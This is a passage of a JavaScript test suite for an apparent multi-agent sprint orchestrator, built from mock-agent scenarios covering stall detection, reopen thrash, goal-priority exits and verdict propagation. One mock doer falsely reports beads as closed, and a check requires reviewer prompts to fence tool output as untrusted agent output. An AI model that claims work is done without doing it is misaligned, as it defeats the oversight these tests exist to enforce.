    // =========================================================================
    // Static-ish check on the source itself: every historically-discarded
    // call site (streak assignment result assigned to a variable that was
    // only ever logged) must now feed a real decision. This is exercised
    // functionally above (multi-doer proves streak assignment is consumed;
    // reopen proves reviewerVerdict is consumed); here we additionally
    // confirm the streak-assignment prompt/response shape round-trips (the
    // mock's streak JSON was parsed and used to build actual streaks, not
    // discarded and replaced unconditionally by the one-bead fallback).
    const multiDoerStreakCalls = multiDoer.dispatched.filter((d) => d.agent === 'planner' && d.prompt.includes('Ready bead ids:'));
    check(multiDoerStreakCalls.length === 1, `Expected exactly 1 streak-assignment dispatch in the multi-doer scenario (single dev round), got ${multiDoerStreakCalls.length}`);

    // =========================================================================
    // apra-fleet-unw.17 (A5) acceptance criterion 1: an orphaned in_progress
    // bead must NOT be read as sprint success
    // =========================================================================
    // Root-cause regression test for the exact A5 bug: `bd list --ready == []`
    // used to be equated with "the sprint is done", even when a bead was
    // left permanently in_progress/blocked (never picked up by any doer
    // because it's not in `--ready`). Here one task is force-set to
    // `in_progress` before the sprint runs (simulating an orphaned bead --
    // e.g. a doer that claimed it in an earlier, now-dead run) and is never
    // touched again; a sibling, independent task closes normally. The
    // sprint must complete (not throw) but its evidence-based final verdict
    // must be FAIL, and the workflow's returned status must be 'failed', not
    // a blanket 'success'.
    console.log('Running mock sprint scenario (orphaned in_progress bead -> not success)...');
    const orphaned = await runDevelopLoopScenario('orphaned', {
        members: ['local'],
        taskSpecs: [
            { title: 'Task: Orphaned in_progress' },
            { title: 'Task: Closes normally (orphaned scenario)' },
        ],
        maxCycles: 1,
        beforeSprint: async ({ tempDir: td, tasks: ts }) => {
            const orphanedTask = ts.find((t) => t.title === 'Task: Orphaned in_progress');
            await runCmd(`bd update ${orphanedTask.id} --status=in_progress`, td);
        },
    });
    check(!orphaned.error, `Orphaned-bead scenario should not throw/reject: ${orphaned.error ? orphaned.error.message : ''}`);
    check(
        orphaned.result && orphaned.result.status !== 'success',
        `Orphaned in_progress bead must NOT be read as sprint success (A5 dead code path), got: ${JSON.stringify(orphaned.result)}`
    );
    check(
        orphaned.result && orphaned.result.verdict === 'FAIL',
        `Expected the evidence-based final verdict to be FAIL, got: ${JSON.stringify(orphaned.result)}`
    );
    const closesNormallyId = orphaned.tasks.find((t) => t.title === 'Task: Closes normally (orphaned scenario)').id;
    check(
        orphaned.finalBeadsById.get(closesNormallyId) && orphaned.finalBeadsById.get(closesNormallyId).status === 'closed',
        `Expected the sibling (non-orphaned) bead to still close normally, got: ${JSON.stringify(orphaned.finalBeadsById.get(closesNormallyId))}`
    );
    const orphanedTaskId = orphaned.tasks.find((t) => t.title === 'Task: Orphaned in_progress').id;
    check(
        orphaned.finalBeadsById.get(orphanedTaskId) && orphaned.finalBeadsById.get(orphanedTaskId).status === 'in_progress',
        `Expected the orphaned bead to remain in_progress (never touched), got: ${JSON.stringify(orphaned.finalBeadsById.get(orphanedTaskId))}`
    );

    // =========================================================================
    // apra-fleet-unw.17 (A5) acceptance criterion 2: stall-abort after 2
    // consecutive zero-progress cycles
    // =========================================================================
    // A doer that always claims success but never actually runs `bd close`
    // (so the assigned bead is never verified-closed -- see the "doer lies"
    // FAILED-streak handling in the Develop loop) keeps the same bead ready
    // forever: the closed-bead count in scope never changes cycle over
    // cycle. With max_cycles=5, the sprint must abort via a typed
    // StalledSprintError well before cycle 5 (after 2 consecutive
    // zero-progress cycles), rather than silently burning every remaining
    // cycle.
    console.log('Running mock sprint scenario (stall-abort: zero progress every cycle)...');
    const stalled = await runDevelopLoopScenario('stalled', {
        members: ['local'],
        taskSpecs: [{ title: 'Task: Never actually closes' }],
        maxCycles: 5,
        doerHandler: async ({ opts }) => {
            const match = opts.prompt.match(/Assigned bead ids \(comma-separated\):\s*(.+)/);
            const ids = match ? match[1].split(',').map((s) => s.trim()).filter(Boolean) : [];
            // Deliberately never runs `bd close` -- the bead stays ready
            // forever and the closed-bead count in scope never advances.
            return { content: [{ text: JSON.stringify({ status: 'VERIFY', closedIds: ids, notes: 'Claims done, never actually closes.' }) }] };
        },
        reviewerHandler: async () => ({
            content: [{ text: JSON.stringify({ verdict: 'APPROVED', notes: 'Approved (mock never inspects real state).', reopenIds: [], newTasks: [] }) }]
        }),
    });
    check(!!stalled.error, 'Expected engine.executeFile() to reject with a stall abort, but it resolved successfully');
    check(
        stalled.error instanceof StalledSprintError,
        `Expected a StalledSprintError, got: ${stalled.error ? stalled.error.constructor.name + ': ' + stalled.error.message : 'no error'}`
    );
    check(
        stalled.error && stalled.error.staleCycles === 2,
        `Expected the StalledSprintError to report staleCycles === 2, got: ${stalled.error ? JSON.stringify(stalled.error.staleCycles) : 'n/a'}`
    );
    // The abort must land well before the max_cycles=5 ceiling -- assert the
    // "Sprint Cycle N" group-start count implied by the closed-count history
    // recorded on the error is short (<=3 cycles), not 5.
    check(
        stalled.error && Array.isArray(stalled.error.closedCountHistory) && stalled.error.closedCountHistory.length <= 3,
        `Expected the stall abort to fire within 3 cycles (well before max_cycles=5), got closedCountHistory: ${stalled.error ? JSON.stringify(stalled.error.closedCountHistory) : 'n/a'}`
    );

    // =========================================================================
    // apra-fleet-unw2.7 (N9): stall detection high-water-mark progress +
    // reopen-thrash flag
    // =========================================================================
    //
    // findings/feedback-reassessment.md N9: the OLD stall detector compared
    // each cycle's closed-bead count only to the IMMEDIATELY PRIOR cycle's
    // count. A close/reopen OSCILLATION -- reviewer keeps sending the same
    // bead back for "one more look" every time it closes, so the sprint
    // never nets any real progress on it -- produces a count sequence like
    // 5,4,5,4,... where every adjacent pair genuinely differs. That defeated
    // the old delta check (which only resets/increments off adjacent
    // equality), so the sprint burned every remaining cycle up to
    // max_cycles doing net-zero work on the oscillating bead instead of
    // aborting.
    //
    // This scenario drives exactly that pattern: one "Oscillator" bead that
    // the mock reviewer reopens EVERY single time it sees it closed (a
    // literal, unconditional "close it, reopen it, repeat" loop -- see the
    // reviewerHandler below), alongside a short dependency CHAIN of five
    // "Filler N" tasks (each blocked on the previous one via `bd link`) that
    // close permanently, one at a time, as they're each unblocked. The
    // filler chain supplies a few cycles of genuine forward progress (so the
    // scenario isn't just a rename of the flat/monotone case immediately
    // above) before it runs out, at which point ONLY the oscillator
    // remains -- reproducing the oscillation failure mode in isolation.
    //
    // Empirically (verified by running this exact scenario before adding
    // assertions) this produces a closed-count history of [3, 5, 5, 5]: a
    // genuine RISE while the filler chain still has beads to reveal, then a
    // PLATEAU once it's exhausted and only the perpetually-reopened
    // oscillator is left. The high-water-mark fix (runner.js's
    // `highWaterClosedCount`) correctly reads the two repeated `5`s at the
    // plateau as zero progress and aborts -- well before `max_cycles`.
    //
    // The mock reviewer's `bd update <id> --status=open` reopen of the
    // oscillator is applied by the ORCHESTRATOR (runner.js), never by the
    // mock itself (see the apra-fleet-unw.16 acceptance criterion 3 test
    // above for the same reviewer-never-mutates-beads contract) -- so this
    // scenario exercises the real per-bead reopen-count bookkeeping added
    // for N9, work item (b), not just a scripted mock side effect.
    console.log('Running mock sprint scenario (N9: close/reopen oscillation drives high-water-mark stall + reopen-thrash flag)...');
    const oscillation = await runDevelopLoopScenario('oscillation', {
        members: ['local'],
        taskSpecs: [
            { title: 'Task: Oscillator' },
            { title: 'Task: Filler 1' },
            { title: 'Task: Filler 2' },
            { title: 'Task: Filler 3' },
            { title: 'Task: Filler 4' },
            { title: 'Task: Filler 5' },
        ],
        // Generous ceiling: the whole point of N9 is that the stall abort
        // must fire well before this, not after burning every cycle.
        maxCycles: 10,
        beforeSprint: async ({ tempDir: td, tasks: ts }) => {
            // F2 depends on F1, F3 depends on F2, etc. -- only one filler is
            // ever `--ready` at a time, so the filler chain contributes one
            // genuine new close per cycle rather than closing all 5 at once
            // on cycle 1 (which would collapse this into a trivial no-op
            // scenario).
            const filler = (n) => ts.find((t) => t.title === `Task: Filler ${n}`);
            await runCmd(`bd link ${filler(2).id} ${filler(1).id}`, td);
            await runCmd(`bd link ${filler(3).id} ${filler(2).id}`, td);
            await runCmd(`bd link ${filler(4).id} ${filler(3).id}`, td);
            await runCmd(`bd link ${filler(5).id} ${filler(4).id}`, td);
        },
        // Default doerHandler closes every assigned bead for real (verified
        // via `bd show`, per the apra-fleet-unw.16 Work item 3 contract) --
        // no override needed here.
        reviewerHandler: async ({ tempDir: td, epicBead: epic }) => {
            const closedRes = JSON.parse((await runCmd(`bd list --parent ${epic.id} --status=closed --json`, td)).stdout || '[]');
            const oscillator = closedRes.find((b) => b.title === 'Task: Oscillator');
            if (oscillator) {
                // Unconditional: EVERY time the oscillator is seen closed,
                // send it back. This is the "close it, reopen it, repeat"
                // pattern named in the N9 acceptance criteria, applied as
                // many times as the Develop/Review loop re-encounters it.
                return {
                    content: [{
                        text: JSON.stringify({
                            verdict: 'CHANGES_NEEDED',
                            notes: 'Sending the oscillator back for another look -- never actually satisfied.',
                            reopenIds: [oscillator.id],
                            newTasks: [],
                        })
                    }]
                };
            }
            return { content: [{ text: JSON.stringify({ verdict: 'APPROVED', notes: 'Filler work approved.', reopenIds: [], newTasks: [] }) }] };
        },
    });
    check(!!oscillation.error, 'Expected the oscillation scenario to reject with a stall abort, but it resolved successfully');
    check(
        oscillation.error instanceof StalledSprintError,
        `Expected a StalledSprintError, got: ${oscillation.error ? oscillation.error.constructor.name + ': ' + oscillation.error.message : 'no error'}`
    );
    check(
        oscillation.error && oscillation.error.staleCycles === 2,
        `Expected the StalledSprintError to report staleCycles === 2 (the configured stall window), got: ${oscillation.error ? JSON.stringify(oscillation.error.staleCycles) : 'n/a'}`
    );
    // The core N9 acceptance criterion: the abort must fire within the
    // configured stall window, NOT after burning all max_cycles=10 -- the
    // OLD delta-based check would have kept resetting staleCycles to 0 on
    // every cycle where the count differed from the cycle before it, and
    // would never have caught this until max_cycles was exhausted.
    check(
        oscillation.error && Array.isArray(oscillation.error.closedCountHistory) && oscillation.error.closedCountHistory.length <= 6,
        `Expected the oscillation stall-abort to fire well within the stall window (well before max_cycles=10), got closedCountHistory: ${oscillation.error ? JSON.stringify(oscillation.error.closedCountHistory) : 'n/a'}`
    );
    // Confirm the run genuinely made SOME real progress first (the filler
    // chain), rather than this degenerating into a copy of the flat/
    // monotone scenario above -- the history must show a real rise before
    // it plateaus.
    check(
        oscillation.error && Array.isArray(oscillation.error.closedCountHistory) && oscillation.error.closedCountHistory.length >= 2 &&
        oscillation.error.closedCountHistory[0] < oscillation.error.highWaterClosedCount,
        `Expected the closed-count history to show a genuine rise before plateauing (not flat from cycle 1), got closedCountHistory: ${oscillation.error ? JSON.stringify(oscillation.error.closedCountHistory) : 'n/a'}, highWaterClosedCount: ${oscillation.error ? oscillation.error.highWaterClosedCount : 'n/a'}`
    );
    // N9 work item (a): the error must report the high-water mark itself
    // (not just the raw history), and the plateau value must equal it.
    check(
        oscillation.error && oscillation.error.highWaterClosedCount === Math.max(...oscillation.error.closedCountHistory),
        `Expected highWaterClosedCount to equal the max of the recorded history, got highWaterClosedCount: ${oscillation.error ? oscillation.error.highWaterClosedCount : 'n/a'}, closedCountHistory: ${oscillation.error ? JSON.stringify(oscillation.error.closedCountHistory) : 'n/a'}`
    );
    // N9 work item (b): the oscillator bead -- reopened far more than the
    // K=3 thrash threshold across this run -- must be named as a thrashing
    // bead directly on the typed error, and its id must appear in the
    // human-readable message too (not just buried in structured details).
    const oscillatorTaskId = oscillation.tasks.find((t) => t.title === 'Task: Oscillator').id;
    check(
        oscillation.error && Array.isArray(oscillation.error.thrashIds) && oscillation.error.thrashIds.includes(oscillatorTaskId),
        `Expected the oscillator bead '${oscillatorTaskId}' to be flagged as a thrashing bead (reopened more than K=3 times), got thrashIds: ${oscillation.error ? JSON.stringify(oscillation.error.thrashIds) : 'n/a'}`
    );
    check(
        oscillation.error && oscillation.error.message.includes(oscillatorTaskId),
        `Expected the StalledSprintError message to name the thrashing bead '${oscillatorTaskId}' directly, got: ${oscillation.error ? oscillation.error.message : 'n/a'}`
    );
    // The filler chain's own beads must never be misflagged as thrash --
    // each of them was only ever reopened zero times (they close once and
    // stay closed).
    const fillerTaskIds = oscillation.tasks.filter((t) => t.title.startsWith('Task: Filler')).map((t) => t.id);
    check(
        oscillation.error && fillerTaskIds.every((id) => !oscillation.error.thrashIds.includes(id)),
        `Did NOT expect any filler bead to be flagged as thrash, got thrashIds: ${oscillation.error ? JSON.stringify(oscillation.error.thrashIds) : 'n/a'}, filler ids: ${JSON.stringify(fillerTaskIds)}`
    );

    // =========================================================================
    // apra-fleet-unw.17 (A5) acceptance criterion 3: goal-priority exit --
    // a P3 open bead does not block P1/P2 goal completion
    // =========================================================================
    console.log('Running mock sprint scenario (goal-priority exit: P3 bead left open)...');
    const goalPriority = await runDevelopLoopScenario('goalpriority', {
        members: ['local'],
        taskSpecs: [
            { title: 'Task: In-goal P2 work' },
            { title: 'Task: Out-of-goal P3 work', priority: 'P3' },
        ],
        maxCycles: 1,
        // Close only the in-goal (P2, default-priority) task; deliberately
        // leave the P3 task open every round -- it must never be dispatched
        // as "blocking" the P1/P2 goal from completing.
        doerHandler: async ({ opts, tempDir: td }) => {
            const match = opts.prompt.match(/Assigned bead ids \(comma-separated\):\s*(.+)/);
            const ids = match ? match[1].split(',').map((s) => s.trim()).filter(Boolean) : [];
            const listRes = JSON.parse((await runCmd('bd list --json', td)).stdout || '[]');
            const p3Task = listRes.find((b) => b.title === 'Task: Out-of-goal P3 work');
            for (const id of ids) {
                if (p3Task && id === p3Task.id) continue; // never close the out-of-goal task
                await runCmd(`bd close ${id}`, td);
            }
            return { content: [{ text: JSON.stringify({ status: 'VERIFY', closedIds: ids.filter((id) => !p3Task || id !== p3Task.id), notes: 'Closed in-goal work only.' }) }] };
        },
        reviewerHandler: async () => ({
            content: [{ text: JSON.stringify({ verdict: 'APPROVED', notes: 'In-goal work approved.', reopenIds: [], newTasks: [] }) }]
        }),
    });
    check(!goalPriority.error, `Goal-priority scenario should not throw: ${goalPriority.error ? goalPriority.error.message : ''}`);
    check(
        goalPriority.result && goalPriority.result.status === 'success',
        `Expected goal-priority completion (P1/P2) despite an open P3 bead, got: ${JSON.stringify(goalPriority.result)}`
    );
    const inGoalId = goalPriority.tasks.find((t) => t.title === 'Task: In-goal P2 work').id;
    const outOfGoalId = goalPriority.tasks.find((t) => t.title === 'Task: Out-of-goal P3 work').id;
    check(
        goalPriority.finalBeadsById.get(inGoalId) && goalPriority.finalBeadsById.get(inGoalId).status === 'closed',
        `Expected the in-goal (P2) bead to be closed, got: ${JSON.stringify(goalPriority.finalBeadsById.get(inGoalId))}`
    );
    check(
        goalPriority.finalBeadsById.get(outOfGoalId) && goalPriority.finalBeadsById.get(outOfGoalId).status !== 'closed',
        `Expected the out-of-goal (P3) bead to remain open (never blocking completion), got: ${JSON.stringify(goalPriority.finalBeadsById.get(outOfGoalId))}`
    );

    // =========================================================================
    // apra-fleet-unw2.6 (N8) regression 1: stale APPROVED verdict must never
    // back an exit decision for a LATER cycle it never actually reviewed --
    // when the exit check's goal-priority count reaches 0 on a cycle whose
    // Develop/Review loop was skipped (no ready beads), a fresh re-review of
    // the current state must be dispatched before the sprint is allowed to
    // exit.
    // =========================================================================
    console.log('Running mock sprint scenario (stale APPROVED verdict must not back a later cycle\'s exit without a fresh re-review)...');
    let staleDeployCalls = 0;
    const staleApproval = await runDevelopLoopScenario('staleapproval', {
        members: ['local'],
        taskSpecs: [
            { title: 'Task: A closes normally (stale-approval scenario)' },
            { title: 'Task: B stays blocked (stale-approval scenario)' },
        ],
        maxCycles: 2,
        withRunbooks: true,
        // Cycle 1: close A, but deliberately leave B `blocked` (an
        // out-of-scope/deferred condition) rather than closed or left
        // `open` -- `blocked` still counts toward the goal-priority open
        // count (NOT_DONE_STATUSES) but is never re-offered via `--ready`,
        // so cycle 2's Develop/Review loop is skipped entirely (no ready
        // beads) -- exactly the "develop skipped" half of the N8 bug.
        doerHandler: async ({ opts, tempDir: td }) => {
            const match = opts.prompt.match(/Assigned bead ids \(comma-separated\):\s*(.+)/);
            const ids = match ? match[1].split(',').map((s) => s.trim()).filter(Boolean) : [];
            const listRes = JSON.parse((await runCmd('bd list --json', td)).stdout || '[]');
            const bTask = listRes.find((b) => b.title === 'Task: B stays blocked (stale-approval scenario)');
            const closedIds = [];
            for (const id of ids) {
                if (bTask && id === bTask.id) {
                    await runCmd(`bd update ${id} --status=blocked`, td);
                } else {
                    await runCmd(`bd close ${id}`, td);
                    closedIds.push(id);
                }
            }
            return { content: [{ text: JSON.stringify({ status: 'VERIFY', closedIds, notes: 'Closed A; left B blocked (out-of-scope, deferred).' }) }] };
        },
        // Approves whatever was actually reviewed each round -- this is the
        // verdict cycle 1 ends on ('APPROVED', with B noted as an
        // out-of-scope blocker) AND the verdict a correctly-dispatched
        // fresh re-review in cycle 2 must independently reach.
        reviewerHandler: async () => ({
            content: [{ text: JSON.stringify({ verdict: 'APPROVED', notes: 'Approved what was reviewed; B intentionally deferred as out-of-scope.', reopenIds: [], newTasks: [] }) }]
        }),
        // Cycle 2's Deploy phase (which runs every cycle regardless of
        // whether Develop/Review ran) closes B out-of-band -- simulating
        // the goal-priority open count reaching 0 on a cycle that never
        // itself reviewed that closure. This is the exact condition a
        // stale `lastReviewVerdict` from cycle 1 could otherwise satisfy.
        deployHandler: async ({ tempDir: td }) => {
            staleDeployCalls++;
            if (staleDeployCalls === 2) {
                const listRes = JSON.parse((await runCmd('bd list --json', td)).stdout || '[]');
                const bTask = listRes.find((b) => b.title === 'Task: B stays blocked (stale-approval scenario)');
                if (bTask) await runCmd(`bd close ${bTask.id}`, td);
            }
            return { content: [{ text: JSON.stringify({ deployed: true, notes: `Deploy call #${staleDeployCalls}` }) }] };
        },
    });
    check(!staleApproval.error, `Stale-approval scenario should not throw: ${staleApproval.error ? staleApproval.error.message : ''}`);
    check(
        staleApproval.result && staleApproval.result.status === 'success',
        `Expected the stale-approval scenario to eventually succeed (backed by a fresh re-review), got: ${JSON.stringify(staleApproval.result)}`
    );
    const staleReviewCalls = staleApproval.dispatched.filter((d) => d.agent === 'reviewer' && d.label !== 'Final Review');
    check(
        staleReviewCalls.length === 2,
        `Expected exactly 2 non-final reviewer dispatches -- cycle 1's real review AND cycle 2's fresh re-review (never relying on cycle 1's stale verdict) -- got ${staleReviewCalls.length}: ${JSON.stringify(staleReviewCalls.map((d) => d.prompt.slice(0, 80)))}`
    );
    check(
        staleApproval.logs.some((m) => m.includes('no review ran THIS cycle') && m.includes('fresh re-review')),
        `Expected a logged re-review dispatch before exit, logs: ${JSON.stringify(staleApproval.logs)}`
    );
    const staleTaskA = staleApproval.tasks.find((t) => t.title === 'Task: A closes normally (stale-approval scenario)');
    const staleTaskB = staleApproval.tasks.find((t) => t.title === 'Task: B stays blocked (stale-approval scenario)');
    check(
        staleApproval.finalBeadsById.get(staleTaskA.id) && staleApproval.finalBeadsById.get(staleTaskA.id).status === 'closed',
        `Expected task A to be closed, got: ${JSON.stringify(staleApproval.finalBeadsById.get(staleTaskA.id))}`
    );
    check(
        staleApproval.finalBeadsById.get(staleTaskB.id) && staleApproval.finalBeadsById.get(staleTaskB.id).status === 'closed',
        `Expected task B to be closed (by the cycle-2 deploy side effect), got: ${JSON.stringify(staleApproval.finalBeadsById.get(staleTaskB.id))}`
    );

    // =========================================================================
    // apra-fleet-unw2.6 (N8) regression 2: CHANGES_NEEDED with empty
    // reopenIds AND empty newTasks (a schema-legal but self-contradictory
    // verdict -- nothing for the orchestrator to act on) must never
    // silently accumulate toward stall-abort even after every bead in scope
    // is already closed. It is retried once, then surfaced distinctly as a
    // ReviewerContractViolationError -- never misreported as
    // StalledSprintError (a finished sprint must not read as "stalled").
    // =========================================================================
    console.log('Running mock sprint scenario (reviewer contract violation: CHANGES_NEEDED with empty reopenIds/newTasks)...');
    const contractViolation = await runDevelopLoopScenario('contractviolation', {
        members: ['local'],
        taskSpecs: [{ title: 'Task: Closes fine but reviewer contradicts itself' }],
        maxCycles: 3,
        // The doer does its job correctly and closes the bead; only the
        // REVIEWER contradicts itself on every round.
        reviewerHandler: async () => ({
            content: [{
                text: JSON.stringify({
                    verdict: 'CHANGES_NEEDED',
                    notes: 'Contradictory: nothing to reopen, nothing new to create, yet not approved.',
                    reopenIds: [],
                    newTasks: [],
                })
            }]
        }),
    });
    check(!!contractViolation.error, 'Expected the reviewer contract violation to abort the sprint with a distinct error, but it resolved successfully');
    check(
        contractViolation.error instanceof ReviewerContractViolationError,
        `Expected a ReviewerContractViolationError, got: ${contractViolation.error ? contractViolation.error.constructor.name + ': ' + contractViolation.error.message : 'no error'}`
    );
    check(
        !(contractViolation.error instanceof StalledSprintError),
        `A finished sprint (bead already closed) hitting a contract-violating reviewer round must never be misreported as StalledSprintError, got: ${contractViolation.error ? contractViolation.error.constructor.name : 'n/a'}`
    );
    const contractViolationTaskId = contractViolation.tasks[0].id;
    check(
        contractViolation.finalBeadsById.get(contractViolationTaskId) && contractViolation.finalBeadsById.get(contractViolationTaskId).status === 'closed',
        `Expected the bead to actually be closed (the doer did its job; only the review contract was violated), got: ${JSON.stringify(contractViolation.finalBeadsById.get(contractViolationTaskId))}`
    );
    check(
        contractViolation.logs.some((m) => m.includes('contract violation')),
        `Expected a logged 'contract violation' warning, logs: ${JSON.stringify(contractViolation.logs)}`
    );
    const contractViolationReviewCalls = contractViolation.dispatched.filter((d) => d.agent === 'reviewer' && d.label !== 'Final Review');
    check(
        contractViolationReviewCalls.length === 2,
        `Expected exactly 2 reviewer dispatches (initial + one retry) before surfacing the contract violation distinctly, got ${contractViolationReviewCalls.length}`
    );

    // =========================================================================
    // apra-fleet-unw.17 (A6) acceptance criterion 4: a final verdict of FAIL
    // propagates to the workflow's returned status, and no unconditional
    // {status:'success'} exists in runner.js's source
    // =========================================================================
    console.log('Running mock sprint scenario (explicit final verdict FAIL propagates)...');
    const explicitFail = await runDevelopLoopScenario('explicitfail', {
        members: ['local'],
        taskSpecs: [{ title: 'Task: Fully closed but explicitly failed by final review' }],
        maxCycles: 1,
        finalReviewHandler: async () => ({
            content: [{ text: JSON.stringify({ verdict: 'FAIL', notes: 'Explicit test-injected FAIL despite all beads closing.' }) }]
        }),
    });
    check(!explicitFail.error, `Explicit-FAIL scenario should not throw: ${explicitFail.error ? explicitFail.error.message : ''}`);
    check(
        explicitFail.result && explicitFail.result.status === 'failed',
        `Expected a FAIL final verdict to produce status:'failed', got: ${JSON.stringify(explicitFail.result)}`
    );
    check(
        explicitFail.result && explicitFail.result.verdict === 'FAIL' && explicitFail.result.notes === 'Explicit test-injected FAIL despite all beads closing.',
        `Expected the final verdict/notes to be surfaced on the result, got: ${JSON.stringify(explicitFail.result)}`
    );

    // =========================================================================
    // apra-fleet-unw2.18 (N18) fix (a): a goal-priority bead with 'deferred'
    // status must be counted as NOT done for the sprint's exit-check logic.
    // A deferred bead AT goal priority (P1/P2, the default task priority)
    // must prevent exit success -- unlike an out-of-goal (P3) bead, which is
    // legitimately never counted regardless of its status (see the
    // "goalpriority" scenario above). `bd list --priority-max=<goalMax>`
    // only includes P3 and worse. Get a bead at goal priority DEFERRED (not
    // closed) so it lands in NOT_DONE_STATUSES's `--priority-max` window.
    // =========================================================================
    console.log('Running mock sprint scenario (deferred goal-priority bead must not allow exit success)...');
    const deferredGoalPriority = await runDevelopLoopScenario('deferredgoalpriority', {
        members: ['local'],
        taskSpecs: [
            { title: 'Task: A closes normally (deferred-goal-priority scenario)' },
            { title: 'Task: B deferred, never closed (deferred-goal-priority scenario)' },
        ],
        maxCycles: 2,
        // Close A normally; defer B (both are default/goal priority, i.e.
        // in-scope for the P1/P2 goal) -- simulating the harvester deferring
        // a goal-priority issue mid-sprint per its contract.
        doerHandler: async ({ opts, tempDir: td }) => {
            const match = opts.prompt.match(/Assigned bead ids \(comma-separated\):\s*(.+)/);
            const ids = match ? match[1].split(',').map((s) => s.trim()).filter(Boolean) : [];
            const listRes = JSON.parse((await runCmd('bd list --json', td)).stdout || '[]');
            const bTask = listRes.find((b) => b.title === 'Task: B deferred, never closed (deferred-goal-priority scenario)');
            const closedIds = [];
            for (const id of ids) {
                if (bTask && id === bTask.id) {
                    await runCmd(`bd update ${id} --status=deferred`, td);
                } else {
                    await runCmd(`bd close ${id}`, td);
                    closedIds.push(id);
                }
            }
            return { content: [{ text: JSON.stringify({ status: 'VERIFY', closedIds, notes: 'Closed A; deferred B (goal-priority, never closed).' }) }] };
        },
        reviewerHandler: async () => ({
            content: [{ text: JSON.stringify({ verdict: 'APPROVED', notes: 'A approved; B deferred (still counts as goal-priority open).', reopenIds: [], newTasks: [] }) }]
        }),
    });
    check(!deferredGoalPriority.error, `Deferred goal-priority scenario should not throw: ${deferredGoalPriority.error ? deferredGoalPriority.error.message : ''}`);
    check(
        !(deferredGoalPriority.result && deferredGoalPriority.result.status === 'success'),
        `Expected the sprint to NOT exit as success while a goal-priority bead remains deferred (never closed), got: ${JSON.stringify(deferredGoalPriority.result)}`
    );
    const deferredTaskA = deferredGoalPriority.tasks.find((t) => t.title === 'Task: A closes normally (deferred-goal-priority scenario)');
    const deferredTaskB = deferredGoalPriority.tasks.find((t) => t.title === 'Task: B deferred, never closed (deferred-goal-priority scenario)');
    check(
        deferredGoalPriority.finalBeadsById.get(deferredTaskA.id) && deferredGoalPriority.finalBeadsById.get(deferredTaskA.id).status === 'closed',
        `Expected task A to be closed, got: ${JSON.stringify(deferredGoalPriority.finalBeadsById.get(deferredTaskA.id))}`
    );
    check(
        deferredGoalPriority.finalBeadsById.get(deferredTaskB.id) && deferredGoalPriority.finalBeadsById.get(deferredTaskB.id).status === 'deferred',
        `Expected task B to remain deferred (never closed), got: ${JSON.stringify(deferredGoalPriority.finalBeadsById.get(deferredTaskB.id))}`
    );

    // =========================================================================
    // apra-fleet-unw2.18 (N18) fix (b): reviewer prompt's embedded bd show
    // --json must be wrapped with wrapUntrustedBlock for A7 fencing compliance.
    // Check the reviewer dispatch prompt contains the same fence markers
    // wrapUntrustedBlock produces elsewhere (see the plan-reviewer round-2
    // prompt assertion above, and contracts.mjs's UNTRUSTED_BLOCK_PREAMBLE /
    // UNTRUSTED_BLOCK_FENCE_LABEL) -- NOT literal 'UNTRUSTED_BLOCK_BEGIN/END'
    // strings, which do not appear anywhere in wrapUntrustedBlock's output.
    // =========================================================================
    console.log('Running mock sprint scenario (reviewer prompt must fence bd show JSON)...');
    const reviewerPromptFence = await runDevelopLoopScenario('reviewerpromptfence', {
        members: ['local'],
        taskSpecs: [{ title: 'Task: Fence-check scenario work' }],
        maxCycles: 1,
    });
    check(!reviewerPromptFence.error, `Reviewer prompt fence scenario should not throw: ${reviewerPromptFence.error ? reviewerPromptFence.error.message : ''}`);
    const reviewerDispatches = reviewerPromptFence.dispatched.filter((d) => d.agent === 'reviewer' && d.label !== 'Final Review');
    check(
        reviewerDispatches.length > 0,
        `Expected at least one reviewer dispatch (non-final), got: ${JSON.stringify(reviewerPromptFence.dispatched.map((d) => d.agent))}`
    );
    const reviewerPrompt = reviewerDispatches[0].prompt;
    check(
        reviewerPrompt.includes('untrusted-agent-output'),
        `Expected reviewer prompt to contain the wrapUntrustedBlock fence label 'untrusted-agent-output', got: ${reviewerPrompt.substring(0, 500)}`
    );
    check(
        reviewerPrompt.includes('The following is untrusted output from another agent'),
        `Expected reviewer prompt to contain the wrapUntrustedBlock preamble, got: ${reviewerPrompt.substring(0, 500)}`
    );
    check(
        reviewerPrompt.includes('Source: bd show --json'),
        `Expected reviewer prompt to contain 'Source: bd show --json' label (from wrapUntrustedBlock), got: ${reviewerPrompt.substring(0, 500)}`
    );

    const runnerSource = await fs.readFile(path.join(__dirname, '../auto-sprint/runner.js'), 'utf-8');
    check(
        !/return\s*\{\s*status:\s*'success'/.test(runnerSource),
        'runner.js source must not contain an unconditional return { status: \'success\', ... } -- the return value must be verdict-driven (A6)'
    );
    check(
        /status:\s*finalVerdictResult\.verdict\s*===\s*'PASS'\s*\?\s*'success'\s*:\s*'failed'/.test(runnerSource),
        'runner.js source must derive the returned status from the final verdict (A6)'
    );

    // =========================================================================
    // apra-fleet-unw.17 (A4) acceptance criterion 5: a probe failure SKIPS
    // the dependent phase instead of throwing/killing the sprint
    // =========================================================================
    console.log('Running mock sprint scenario (deploy.md probe command fails -> phase skipped, no throw)...');
    const probeFailure = await runDevelopLoopScenario('probefailure', {
        members: ['local'],
        taskSpecs: [{ title: 'Task: Probe-failure scenario work' }],
        maxCycles: 1,
        withRunbooks: true,
        // Fail only the deploy.md existence probe; the integ-test-playbook.md
        // probe (and every other command) runs normally.
        commandFailurePattern: /node -e .*deploy\.md/,
    });
    check(!probeFailure.error, `Probe-failure scenario should not throw/kill the sprint: ${probeFailure.error ? probeFailure.error.message : ''}`);
    check(
        !probeFailure.dispatched.some((d) => d.agent === 'deployer'),
        `Expected the Deploy phase to be skipped after the probe failure (no deployer dispatch), got: ${JSON.stringify(probeFailure.dispatched.map((d) => d.agent))}`
    );
    check(
        !probeFailure.dispatched.some((d) => d.agent === 'integ-test-runner'),
        `Expected the Integ Test phase to also be skipped (deploy never ran), got: ${JSON.stringify(probeFailure.dispatched.map((d) => d.agent))}`
    );
    check(
        probeFailure.logs.some((m) => m.includes("Probe for 'deploy.md' failed")),
        `Expected a logged warning naming the failed probe, logs: ${JSON.stringify(probeFailure.logs)}`
    );

    // =========================================================================
    // apra-fleet-unw.17 (A5) acceptance criterion 6: bd JSON noise produces a
    // diagnostic error naming the command, not a bare SyntaxError
    // =========================================================================
    let bdJsonNoiseError = null;
    try {
        parseBdJson('WARN: some deprecation notice\n[]', 'bd list --parent bd-1 --ready --json');
    } catch (err) {
        bdJsonNoiseError = err;
    }
    check(!!bdJsonNoiseError, 'Expected parseBdJson() to throw on noisy (non-JSON) bd output');
    check(
